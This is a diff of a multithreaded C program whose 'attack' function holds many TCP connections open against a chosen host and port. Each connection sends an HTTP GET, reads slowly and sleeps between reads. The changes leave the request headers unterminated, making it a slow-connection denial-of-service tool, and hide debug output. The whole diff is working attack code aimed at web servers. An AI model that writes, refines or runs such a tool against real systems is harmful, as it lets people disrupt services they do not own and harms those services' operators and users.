@@ -32,9 +32,9 @@ const int attack(const char *dest, const int portno)
     struct hostent *server;
     char dest_ip[INET_ADDRSTRLEN];
 
-    const int buffer_size = 2;
+    enum { buffer_size = 2 };
     char buffer[buffer_size+1];
-    const char get_request[] = "GET / HTTP/1.1\r\n\r\n";
+    const char get_request[] = "GET / HTTP/1.1\r\n";
 
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) 
@@ -45,13 +45,15 @@ const int attack(const char *dest, const int portno)
         return EXIT_FAILURE;
     }
 
-    inet_ntop(AF_INET, server->h_addr, dest_ip, INET_ADDRSTRLEN);
+    inet_ntop(AF_INET, server->h_addr_list[0], dest_ip, INET_ADDRSTRLEN);
+    #ifdef DEBUG
     printf("Resolved IP: %s\n", dest_ip);
+    #endif
 
     memset((char *) &serv_addr, 0, sizeof(serv_addr));
     serv_addr.sin_family = AF_INET;
     memcpy((char *)&serv_addr.sin_addr.s_addr,
-        (char *)server->h_addr,
+        (char *)server->h_addr_list[0],
         server->h_length);
     serv_addr.sin_port = htons(portno);
     if (connect(sockfd,(struct sockaddr *) &serv_addr,sizeof(serv_addr)) < 0) 
@@ -68,7 +70,6 @@ const int attack(const char *dest, const int portno)
         else if (n >  0)
         {
             buffer[buffer_size] = '\0';
-            printf("%s\n",buffer);
             sleep(20);
         }
         else
@@ -83,6 +84,7 @@ void *worker(void *t)
 {
     struct worker_params *params = (struct worker_params *)t;
     int *retVal;
+    int tmp;
 
     retVal = (int *)malloc(sizeof(int));
     if(!retVal)
@@ -91,9 +93,12 @@ void *worker(void *t)
         pthread_exit(NULL);
     }
 
-    int tmp = attack(params->host, params->port);
+    tmp = attack(params->host, params->port);
+    #ifdef DEBUG
+    printf("Value of tmp: %d\n", tmp);
+    #endif
     memcpy(retVal, &tmp, sizeof(int));
-    pthread_exit(retVal);
+    pthread_exit((void *)retVal);
 }
 
 int main(int argc, char **argv)
@@ -105,7 +110,14 @@ int main(int argc, char **argv)
     int port;
     int i;
     struct worker_params *params;
-    int status;
+    int *status;
+
+    struct option opts[] = {
+        { "host",       required_argument,  NULL,   'h' },
+        { "port",       required_argument,  NULL,   'p' },
+        { "threads",    required_argument,  NULL,   't' },
+        { NULL,         0,                  NULL,   0 }
+    };
 
     pthread_attr_t attr;
     pthread_t *threads;
@@ -114,12 +126,6 @@ int main(int argc, char **argv)
     host[0] = 0;
     port = -1;
 
-    struct option opts[] = {
-        { "host",       required_argument,  NULL,   'h' },
-        { "port",       required_argument,  NULL,   'p' },
-        { "threads",    required_argument,  NULL,   't' },
-        { NULL,         0,                  NULL,   0 }
-    };
     
     while((ch = getopt_long(argc, argv, "h:p:t:", opts, NULL)) != -1)
     {
@@ -135,7 +141,7 @@ int main(int argc, char **argv)
             port = (int)strtol(optarg, NULL, 10);
             break;
         case 't':
-            printf("Threads: %s", optarg);
+            printf("Threads: %s\n", optarg);
             numThreads = (int)strtol(optarg, NULL, 10);
             break;
         default:
@@ -161,13 +167,17 @@ int main(int argc, char **argv)
         fprintf(stderr, "Failed to intialize thread attributes. Code: %d", retVal);
         return EXIT_FAILURE;
     }
-    printf("Thread attributes initialized");
+    #ifdef DEBUG
+    printf("Thread attributes initialized\n");
+    #endif
 
     threads = malloc(numThreads * sizeof(pthread_t));
     if(!threads)
         error("Failed to initialize pthread_t memory");
-    printf("pthread memory initialized");
-    printf("Starting attack");
+    #ifdef DEBUG
+    printf("pthread memory initialized\n");
+    #endif
+    printf("Starting attack\n");
 
     for(i=0; i<numThreads; i++)
     {
@@ -178,17 +188,26 @@ int main(int argc, char **argv)
             return EXIT_FAILURE;
         }
     }
+    pthread_attr_destroy(&attr);
 
     printf("Wait for attackers\n");
+    status = NULL;
     for(i=0; i<numThreads; i++)
     {
-        retVal = pthread_join(threads[i], (void *)&status);
+        retVal = pthread_join(threads[i], (void *)status);
         if(retVal)
             printf("Failed to join thread %d. Code: %d\n", i, retVal);
         else
         {
-            printf("Thread %d completed with code %d\n", i, status);
-            free(&status);
+            printf("Thread %d completed with ", i);
+            if(status)
+            {
+                printf("code %d", *status);
+                free(status);
+            }
+            else
+                printf("code not returned");
+            printf("\n");
         }
     }
 
